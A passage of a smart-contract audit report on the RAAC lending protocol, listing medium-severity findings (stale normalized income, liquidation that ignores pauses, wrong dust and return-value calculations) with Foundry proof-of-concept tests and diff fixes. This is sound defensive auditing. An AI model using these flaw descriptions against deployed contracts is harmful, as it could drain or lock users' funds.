function _rebalanceLiquidity() internal {
    // if curve vault is not set, do nothing
    if (address(curveVault) == address(0)) {
        return;
    }

    uint256 totalDeposits = reserve.totalLiquidity; // Total liquidity in the system // @note : 총 deposit한 값
    uint256 desiredBuffer = totalDeposits.percentMul(liquidityBufferRatio); // 기본 값이 20%
    uint256 currentBuffer = IERC20(reserve.reserveAssetAddress).balanceOf( // @note : 현시점 가지고 있는 token 계산
        reserve.reserveRTokenAddress
    );

    if (currentBuffer > desiredBuffer) { // @note : 만약 가지고 있는 돈이 더 많으면
        uint256 excess = currentBuffer - desiredBuffer;
        // Deposit excess into the Curve vault
        _depositIntoVault(excess);
    } else if (currentBuffer < desiredBuffer) { // @note : 만약 가지고 있는 돈이 더 적으면
        uint256 shortage = desiredBuffer - currentBuffer;
        // Withdraw shortage from the Curve vault
        _withdrawFromVault(shortage);
    }

    emit LiquidityRebalanced(currentBuffer, totalVaultDeposits);
}
```

* Borrowed Assets Not Reflected: When a user borrows tokens, the protocol’s total supply might not decrease accordingly, and this mismatch skews the dust calculation.

```Solidity
function borrow(
    uint256 amount
) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    if (isUnderLiquidation[msg.sender])
        revert CannotBorrowUnderLiquidation();

    UserData storage user = userData[msg.sender];

    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue == 0) revert NoCollateral();

    // Update reserve state before borrowing
    ReserveLibrary.updateReserveState(reserve, rateData);
    ...
```

* Incorrect Dust Logic: The function calculates dust by comparing contractBalance and totalRealBalance. But if contractBalance is less than expected due to external vaults or borrowing, the function returns zero dust, effectively blocking fee withdrawals.

Additionally, the calculateDustAmount function is incorrectly implemented. However, this is not relevant to the vulnerability in the current report, so I'll cover it in another report.

### 04. Impact

Because the dust always appears to be zero in some scenarios, the owner cannot withdraw protocol fees. This can lead to fee revenue getting stuck in the protocol without any easy mechanism to claim it, reducing the protocol’s ability to properly allocate funds.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Include All Assets in the Calculation

## <a id='M-02'></a>M-02. Incorrect Return Value in ReserveLibrary::getNormalizedDebt Function            



### 01. Relevant GitHub Links

&#x20;

* [ReserveLibrary.sol#L470](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/libraries/pools/ReserveLibrary.sol#L470)

### 02. Summary

`ReserveLibrary::getNormalizedDebt` is intended to return the NormalizedDebt value. However, when `timeDelta < 1`, it returns `reserve.totalUsage` instead of `reserve.usageIndex`. By contrast, `getNormalizedIncome` correctly returns `reserve.liquidityIndex` in the same scenario. This mismatch can cause confusion or errors in calculations that rely on getNormalizedDebt.

### 03. Vulnerability Details

If `timeDelta < 1`, the function returns `reserve.totalUsage` instead of `reserve.usageIndex`, which may lead to incorrect debt values.

```Solidity
function getNormalizedDebt(ReserveData storage reserve, ReserveRateData storage rateData) internal view returns (uint256) {
    uint256 timeDelta = block.timestamp - uint256(reserve.lastUpdateTimestamp);
    if (timeDelta < 1) {
        return reserve.totalUsage;
    }

    return calculateCompoundedInterest(rateData.currentUsageRate, timeDelta).rayMul(reserve.usageIndex);
}
```

Meanwhile, `getNormalizedIncome` properly returns `reserve.liquidityIndex` under similar conditions.

```Solidity
function getNormalizedIncome(ReserveData storage reserve, ReserveRateData storage rateData) internal view returns (uint256) {
    uint256 timeDelta = block.timestamp - uint256(reserve.lastUpdateTimestamp);
    if (timeDelta < 1) {
        return reserve.liquidityIndex;
    }
    
    return calculateLinearInterest(rateData.currentLiquidityRate, timeDelta, reserve.liquidityIndex).rayMul(reserve.liquidityIndex);
}
```

### 04. Impact

While `getBorrowRate` (which uses `getNormalizedDebt`) is not currently in use, this incorrect behavior in the library could cause issues in other protocols or future upgrades. It might produce unexpected debt calculations, potentially leading to interest rate or utilization mismatches.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

```diff
function getNormalizedDebt(ReserveData storage reserve, ReserveRateData storage rateData) internal view returns (uint256) {
    uint256 timeDelta = block.timestamp - uint256(reserve.lastUpdateTimestamp);
    if (timeDelta < 1) {
-       return reserve.totalUsage;
+       return reserve.usageIndex;
    }

    return calculateCompoundedInterest(rateData.currentUsageRate, timeDelta).rayMul(reserve.usageIndex);
}
```

## <a id='M-03'></a>M-03. Race Condition in House Price Updates            



### 01. Relevant GitHub Links

* [RAACHousePriceOracle.sol#L44](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/oracles/RAACHousePriceOracle.sol#L44)

### 02. Summary

When multiple requests are sent in quick succession for different house NFT IDs, there is a chance that all price updates will apply to the same, most recently set ID. Furthermore, if responses arrive out of order in an asynchronous environment, a later request could overwrite an earlier request’s intended price, leaving the earlier NFT ID without an updated price.

### 03. Vulnerability Details

The contract relies on a global variable (lastHouseId) to store the NFT ID before processing oracle responses. In an asynchronous setting like Chainlink Functions, rapid or simultaneous requests can lead to two primary issues:

```Solidity
/**
 * @notice Process the response from the oracle
 * @param response The response from the oracle
 */
function _processResponse(bytes memory response) internal override {
    uint256 price = abi.decode(response, (uint256));
@>  housePrices.setHousePrice(lastHouseId, price);

    emit HousePriceUpdated(lastHouseId, price);
}
```

1. If multiple requests are in flight, slow oracle responses can result in all updates writing to the same ID, causing temporary or permanent mispricing.
2. If the response order is reversed (the later request arrives first), the wrong NFT ID might receive the price meant for another ID, potentially becoming a persistent error.

While the sendRequest function is limited to the owner, the likelihood increases if the owner submits many requests at once for multiple NFTs.

Although the sendRequest function to send the request can only be executed by the owner, given the existence of multiple house NFTs and the fact that various NFTs will be added in the future, the owner may send the request at once for faster processing. This can be problematic enough.

```Solidity
function sendRequest(
    string calldata source,
    FunctionsRequest.Location secretsLocation,
    bytes calldata encryptedSecretsReference,
    string[] calldata args,
    bytes[] calldata bytesArgs,
    uint64 subscriptionId,
    uint32 callbackGasLimit
) external onlyOwner {
```

### 04. Impact

* Incorrect pricing for multiple house NFTs
* Potentially permanent mispricing if subsequent requests do not override the erroneous updates
* Reduced trust in the pricing mechanism, negatively affecting the overall system

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

* Include the NFT ID in the oracle’s response and use it to determine which house NFT price to update, instead of relying on a single global variable.
* Verify that the received ID matches the intended house NFT ID before setting the price.

## <a id='M-04'></a>M-04. Outdated NormalizedIncome in RToken Transfer Functions            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L212](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L212)
* [RToken.sol#L223](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L223)

### 02. Summary

When transferring RToken (or using functions like `transfer`, `transferFrom`, `approve`, `permit`) that rely on `ILendingPool(_reservePool).getNormalizedIncome()`, the value obtained for NormalizedIncome can be outdated. If `pool.updateState()` has not been recently called or if there has been no protocol interaction for a while, transferring tokens can result in a transfer of more tokens than intended.

### 03. Vulnerability Details

RToken uses the function `ILendingPool(_reservePool).getNormalizedIncome()` to scale the amount parameter in its `transfer-related` methods:

```Solidity
function transfer(address recipient, uint256 amount) public override(ERC20, IERC20) returns (bool) {
    uint256 scaledAmount = amount.rayDiv(ILendingPool(_reservePool).getNormalizedIncome());

    return super.transfer(recipient, scaledAmount);
}

```

If `getNormalizedIncome()` is outdated because `pool.updateState()` was not called for a while, the user might transfer more tokens than they intended. This issue applies to any function using the same approach, including `transferFrom`, `approve`, and `permit`.

### 04. Impact

* Users can inadvertently transfer more tokens than expected.
* The system’s internal accounting may become inconsistent if the NormalizedIncome used for calculations is not refreshed.

### 05. Proof of Concept

you can see that calling transfer without updating the pool state can lead to an actual transfer amount exceeding the expected `10e18` tokens. The reason why exactly 10e18 is not transferred after the actual updateState is due to a bad implementation of the transfer function, which we'll cover in another report.

```Solidity
$ forge test --mt test_poc_transfer_need_updateState -vv

Logs:
  
no updateState before transfer()
  rTokenInstance.balanceOf(alice):  40019421487603305785
  rTokenInstance.balanceOf(hyuunn):  10004855371900826446
  
updateState before transfer()
  rTokenInstance.balanceOf(alice):  40029129875085409916
  rTokenInstance.balanceOf(hyuunn):  9995146984418722315

```

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {IRToken, RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_transfer_need_updateState() public {
        // 1. bob deposit, depositNFT, borrow
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(500e18);

        raacNFTInstance.approve(address(lendingPoolInstance), 1);
        lendingPoolInstance.depositNFT(1);

        lendingPoolInstance.borrow(10e18);
        vm.stopPrank();

        // 2. alice deposit 50e18
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 50e18);
        lendingPoolInstance.deposit(50e18);

        // 3. Time passes without the state of the pool being updated. 
        vm.warp(block.timestamp + 365 days);
        uint256 snapshot = vm.snapshotState();

        // 4. alice tries to transfer 50e18 to hyuunn.
        rTokenInstance.transfer(hyuunn, 10e18);
        lendingPoolInstance.updateState();

        console.log("\\nno updateState before transfer()");
        console.log("rTokenInstance.balanceOf(alice): ", rTokenInstance.balanceOf(alice));
        console.log("rTokenInstance.balanceOf(hyuunn): ", rTokenInstance.balanceOf(hyuunn));

        vm.revertToState(snapshot);
        lendingPoolInstance.updateState();

        rTokenInstance.transfer(hyuunn, 10e18);

        console.log("\\nupdateState before transfer()");
        console.log("rTokenInstance.balanceOf(alice): ", rTokenInstance.balanceOf(alice));
        console.log("rTokenInstance.balanceOf(hyuunn): ", rTokenInstance.balanceOf(hyuunn));
    }

}
```

### 06. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```diff
function transfer(address recipient, uint256 amount) public override(ERC20, IERC20) returns (bool) {
+   ILendingPool(_reservePool).updateState()
    uint256 scaledAmount = amount.rayDiv(ILendingPool(_reservePool).getNormalizedIncome());

    return super.transfer(recipient, scaledAmount);
}
```

Perform updateState before performing any transfer-related logic functions.

## <a id='M-05'></a>M-05. Market Pause Prevents Debt Repayment and Collateral Addition            



### 01. Relevant GitHub Links

&#x20;

* [LendingPool.sol#L265](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L265)
* [LendingPool.sol#L265](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L265)
* [LendingPool.sol#L496](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L496)

### 02. Summary

When the contract is paused, users cannot call `depositNFT` to add collateral or `repay` to pay off their debt. However, the `finalizeLiquidation` function remains callable, allowing liquidations to proceed. As a result, once liquidation begins, users have no way to protect themselves if the market is paused.

### 03. Vulnerability Details

depositNFT and repay both require whenNotPaused

During a pause, new collateral cannot be posted, and debt cannot be repaid.

```Solidity
function depositNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    if (raacNFT.ownerOf(tokenId) != msg.sender) revert NotOwnerOfNFT();

    UserData storage user = userData[msg.sender];
    if (user.depositedNFTs[tokenId]) revert NFTAlreadyDeposited();

    user.nftTokenIds.push(tokenId);
    user.depositedNFTs[tokenId] = true;

    raacNFT.safeTransferFrom(msg.sender, address(this), tokenId);

    emit NFTDeposited(msg.sender, tokenId);
}
```

```Solidity
/**
 * @notice Allows a user to repay their own borrowed reserve assets
 * @param amount The amount to repay
 */
function repay(
    uint256 amount
) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    _repay(amount, msg.sender);
}
```

Even while paused, the finalizeLiquidation function can still be called by the Stability Pool.

```Solidity
/**
 * @notice Allows the Stability Pool to finalize the liquidation after the grace period has expired
 * @param userAddress The address of the user being liquidated
 */
function finalizeLiquidation(
    address userAddress
) external nonReentrant onlyStabilityPool { 
    if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);
```

If a user’s liquidation process starts and the market is paused, that user cannot prevent or stop liquidation because they cannot add collateral or repay their debt.

Because finalizeLiquidation remains accessible while the market is paused, users who rely on repaying or adding collateral to avoid liquidation will be unable to do so.

### 04. Impact

* Users can be forced into liquidation if the market is paused.
* No mechanism exists for users to protect themselves by adding collateral or repaying debt during this period.
* This could lead to unexpected asset loss and liquidation events.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Allow debt repayment and collateral addition (repay and depositNFT) even when the market is paused.

## <a id='M-06'></a>M-06. In RToken Contract, the mint and burn functions return incorrect values.            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L140](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L140)
* [RToken.sol#L184](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L184)

### 02. Summary

The mint and burn functions of RToken Contract are returning incorrect values.

### 03. Vulnerability Details

The code below is the `RToken::mint` function.

```Solidity
function mint(
    address caller,
    address onBehalfOf,
    uint256 amountToMint,
    uint256 index
) external override onlyReservePool returns (bool, uint256, uint256, uint256) {
    if (amountToMint == 0) {
        return (false, 0, 0, 0);
    }
    uint256 amountScaled = amountToMint.rayDiv(index);
    if (amountScaled == 0) revert InvalidAmount();

    uint256 scaledBalance = balanceOf(onBehalfOf);
    bool isFirstMint = scaledBalance == 0;

    uint256 balanceIncrease = 0;
    if (_userState[onBehalfOf].index != 0 && _userState[onBehalfOf].index < index) {
        balanceIncrease = scaledBalance.rayMul(index) - scaledBalance.rayMul(_userState[onBehalfOf].index);
    }

    _userState[onBehalfOf].index = index.toUint128();

    _mint(onBehalfOf, amountToMint.toUint128());

    emit Mint(caller, onBehalfOf, amountToMint, index);

@>  return (isFirstMint, amountToMint, totalSupply(), amountScaled);
}

```

The description of the return value says that the second argument should be the amount of scaled tokens and the fourth argument should be the amount of underlying tokens minted, but it actually returns the opposite.

```Solidity
 * @return A tuple containing:
 *         - bool: True if this is the first mint for the recipient, false otherwise
 *         - uint256: The amount of scaled tokens minted
 *         - uint256: The new total supply after minting
 *         - uint256: The amount of underlying tokens minted
 */

```

A similar problem occurs with the `RToken::burn` function.

```Solidity
function burn(
    address from,
    address receiverOfUnderlying,
    uint256 amount,
    uint256 index
) external override onlyReservePool returns (uint256, uint256, uint256) {
    if (amount == 0) {
        return (0, totalSupply(), 0);
    }

    uint256 userBalance = balanceOf(from);  

    _userState[from].index = index.toUint128();

    if(amount > userBalance){
        amount = userBalance;
    }

    uint256 amountScaled = amount.rayMul(index);

    _userState[from].index = index.toUint128();

    _burn(from, amount.toUint128());

    if (receiverOfUnderlying != address(this)) {
        IERC20(_assetAddress).safeTransfer(receiverOfUnderlying, amount);
    }

    emit Burn(from, receiverOfUnderlying, amount, index);

@>  return (amount, totalSupply(), amount);
}

```

The description of the return value says that the first argument should be the amount of scaled tokens burned and the third argument should be the amount of underlying asset transferred, but in reality, they are both returning the same amount.

```Solidity
 * @return A tuple containing:
 *         - uint256: The amount of scaled tokens burned
 *         - uint256: The new total supply after burning
 *         - uint256: The amount of underlying asset transferred
 */

```

### 04. Impact

* Incorrectly returned values can cause unexpected problems when used in other contracts.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

```diff
function mint(
    address caller,
    address onBehalfOf,
    uint256 amountToMint,
    uint256 index
) external override onlyReservePool returns (bool, uint256, uint256, uint256) {
    if (amountToMint == 0) {
        return (false, 0, 0, 0);
    }

		...

-   return (isFirstMint, amountToMint, totalSupply(), amountScaled);
+   return (isFirstMint, amountScaled, totalSupply(), amountToMint);
}

```

```diff
function burn(
    address from,
    address receiverOfUnderlying,
    uint256 amount,
    uint256 index
) external override onlyReservePool returns (uint256, uint256, uint256) {
    if (amount == 0) {
        return (0, totalSupply(), 0);
    }

    uint256 userBalance = balanceOf(from);  

    _userState[from].index = index.toUint128();

    if(amount > userBalance){
        amount = userBalance;
    }

    uint256 amountScaled = amount.rayMul(index);

    _userState[from].index = index.toUint128();

    _burn(from, amount.toUint128());

    if (receiverOfUnderlying != address(this)) {
        IERC20(_assetAddress).safeTransfer(receiverOfUnderlying, amount);
    }

    emit Burn(from, receiverOfUnderlying, amount, index);

-   return (amount, totalSupply(), amount);
+   return (amountScaled, totalSupply(), amount);
}

```

## <a id='M-07'></a>M-07. Incorrect Dust Calculation in RToken            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L317](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L317)

### 02. Summary

In the `RToken` contract, there is a function called `calculateDustAmount` used to compute the dust balance in the contract. This dust is then transferred using `transferAccruedDust` to claim protocol fees. However, the calculation in calculateDustAmount is incorrect, causing the function to return zero dust even when a non-zero dust balance actually exists. As a result, the `transferAccruedDust` function fails and prevents the protocol from collecting fees.

### 03. Vulnerability Details

Inside calculateDustAmount, the contract balance is scaled by performing an additional division, while the total supply is also scaled again. Specifically:

* contractBalance applies a division with rayDiv, reducing the value.
* currentTotalSupply returns a value that is already de-scaled, but then the code applies an additional rayMul to it.
* This leads to an incorrect comparison between contractBalance and totalRealBalance, causing the dust amount calculation to be zero despite existing dust.

```
/**
 * @notice Calculate the dust amount in the contract
 * @return The amount of dust in the contract
 */
function calculateDustAmount() public view returns (uint256) {
    // Calculate the actual balance of the underlying asset held by this contract
@>  uint256 contractBalance = IERC20(_assetAddress).balanceOf(address(this)).rayDiv(ILendingPool(_reservePool).getNormalizedIncome());

    // Calculate the total real obligations to the token holders
    uint256 currentTotalSupply = totalSupply();

    // Calculate the total real balance equivalent to the total supply
@>  uint256 totalRealBalance = currentTotalSupply.rayMul(ILendingPool(_reservePool).getNormalizedIncome());

    // All balance, that is not tied to rToken are dust (can be donated or is the rest of exponential vs linear)
    return contractBalance <= totalRealBalance ? 0 : contractBalance - totalRealBalance;
}
```

### 04. Impact

Because the dust calculation always wrong, transferAccruedDust reverts when it attempts to transfer dust. Or only receive the smaller value. This prevents the contract owner or protocol from retrieving the accrued fee portion, resulting in lost fee revenue.

### 05. Proof of Concept

When running the test test\_poc\_calculateDustAmount with Foundry (using `forge test --mt test_poc_calculateDustAmount -vv`), the log output shows that calculateDustAmount returns zero, even though there is a real dust balance of `3300802636529422469`. Because the function returns zero, transferAccruedDust fails and no dust is transferred.

```
  calculated dust amount:  0
  rTokenContractTotalBalance:  55488302636529422469
  rTokenContractTotalSupply:  52187500000000000000
  real dust amount:  3300802636529422469
  transferAccruedDust failed

```

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {IRToken, RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_calculateDustAmount() public {
        // 0. set protocolFeeRate as 50%
        lendingPoolInstance.setProtocolFeeRate(0.5e27);
        
        // 1. bob deposit, depositNFT, borrow
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(50e18);

        raacNFTInstance.approve(address(lendingPoolInstance), 1);
        lendingPoolInstance.depositNFT(1);

        lendingPoolInstance.borrow(10e18);

        // 2. Over time, bob repays the debt.
        vm.warp(block.timestamp + 365 days * 10);

        crvUSDTokenInstance.approve(address(lendingPoolInstance), type(uint256).max);
        lendingPoolInstance.repay(type(uint256).max);

        vm.stopPrank();
        
        // 3. The accrued fee is collected by admin by calling the transferAccruedDust function.
        // Calculate the fee incurred through the calculateDustAmount function.
        console.log("calculated dust amount: ", rTokenInstance.calculateDustAmount());

        uint256 rTokenContractTotalBalance = crvUSDTokenInstance.balanceOf(address(rTokenInstance));
        uint256 rTokenContractTotalSupply = rTokenInstance.totalSupply();

        console.log("rTokenContractTotalBalance: ", rTokenContractTotalBalance);
        console.log("rTokenContractTotalSupply: ", rTokenContractTotalSupply);
        console.log("real dust amount: ", rTokenContractTotalBalance - rTokenContractTotalSupply);

        vm.expectRevert(IRToken.NoDust.selector);
        lendingPoolInstance.transferAccruedDust(address(this), type(uint256).max);
        console.log("transferAccruedDust failed");
    }
}


```

### 06. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```diff
/**
 * @notice Calculate the dust amount in the contract
 * @return The amount of dust in the contract
 */
function calculateDustAmount() public view returns (uint256) {
    // Calculate the actual balance of the underlying asset held by this contract
-   uint256 contractBalance = IERC20(_assetAddress).balanceOf(address(this)).rayDiv(ILendingPool(_reservePool).getNormalizedIncome());
+   uint256 contractBalance = IERC20(_assetAddress).balanceOf(address(this));    

    // Calculate the total real obligations to the token holders
    uint256 currentTotalSupply = totalSupply();

    // Calculate the total real balance equivalent to the total supply
-   uint256 totalRealBalance = currentTotalSupply.rayMul(ILendingPool(_reservePool).getNormalizedIncome());
+   uint256 totalRealBalance = currentTotalSupply;

    // All balance, that is not tied to rToken are dust (can be donated or is the rest of exponential vs linear)
    return contractBalance <= totalRealBalance ? 0 : contractBalance - totalRealBalance;
}

```

## <a id='M-08'></a>M-08. Incorrect Liquidation Closure and Finalization Logic            



### 01. Relevant GitHub Links

&#x20;

* [LendingPool.sol#L468](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L468)
* [LendingPool.sol#L496](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L496)

### 02. Summary

In the `LendingPool::closeLiquidation` function, users are allowed to close their liquidation only if their total debt is below a fixed `DUST_THRESHOLD`. This design prevents users from closing liquidation even if they improve their collateral situation by adding more collateral or if the market value of their collateral increases. Conversely, if a user’s borrowed amount is below `DUST_THRESHOLD` and they enter liquidation, they can immediately close it without repaying debt or adding collateral.

A similar issue applies to `finalizeLiquidation`: once the grace period has passed, liquidation proceeds without re-evaluating whether the user’s collateral has become sufficient or whether some debt has been repaid. This results in users losing collateral even though they may have recovered a healthy health factor.

### 03. Vulnerability Details

`LendingPool::closeLiquidation` Logic

* The function only checks whether the user’s debt is less than or equal to `DUST_THRESHOLD`.
* If the debt is above `DUST_THRESHOLD`, the liquidation cannot be closed, even when the user’s health factor has improved in other ways.
* Conversely, if a user’s borrowed amount is below DUST\_THRESHOLD and they enter liquidation, they can immediately close it without repaying debt or adding collateral.

```Solidity
/**
 * @notice Allows a user to repay their debt and close the liquidation within the grace period
 */
function closeLiquidation() external nonReentrant whenNotPaused {
    address userAddress = msg.sender;

    if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    if (
        block.timestamp >
        liquidationStartTime[userAddress] + liquidationGracePeriod
    ) {
        revert GracePeriodExpired();
    }

    UserData storage user = userData[userAddress];

    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);

@>  if (userDebt > DUST_THRESHOLD) revert DebtNotZero();

    isUnderLiquidation[userAddress] = false;
    liquidationStartTime[userAddress] = 0;

    emit LiquidationClosed(userAddress);
}
```

finalizeLiquidation Logic

```Solidity
/**
 * @notice Allows the Stability Pool to finalize the liquidation after the grace period has expired
 * @param userAddress The address of the user being liquidated
 */
function finalizeLiquidation(
    address userAddress
) external nonReentrant onlyStabilityPool {
    if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    if (
        block.timestamp <=
@>      liquidationStartTime[userAddress] + liquidationGracePeriod
    ) {
        revert GracePeriodNotExpired();
    }

    UserData storage user = userData[userAddress];

    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);

    isUnderLiquidation[userAddress] = false;
    liquidationStartTime[userAddress] = 0;
    
    // Transfer NFTs to Stability Pool
@>  for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
        uint256 tokenId = user.nftTokenIds[i];
        user.depositedNFTs[tokenId] = false;
        raacNFT.transferFrom(address(this), stabilityPool, tokenId);
    }
    delete user.nftTokenIds;
    ...
```

* After the grace period, it only checks whether the specified time has elapsed.
* Even if the user’s collateral value is sufficient or the user has partially repaid enough debt to reach a healthy state, the contract proceeds with liquidation.

### 04. Impact

* Users who wish to close liquidation by providing additional collateral or benefiting from increasing collateral value cannot stop liquidation if their debt exceeds `DUST_THRESHOLD`.
* Users with very small borrow amounts can close liquidation immediately, ignoring the requirement to repay.
* During finalization, valuable collateral may be liquidated despite the user potentially achieving a healthy collateral-to-debt ratio after the liquidation started.

### 05. Tools Used

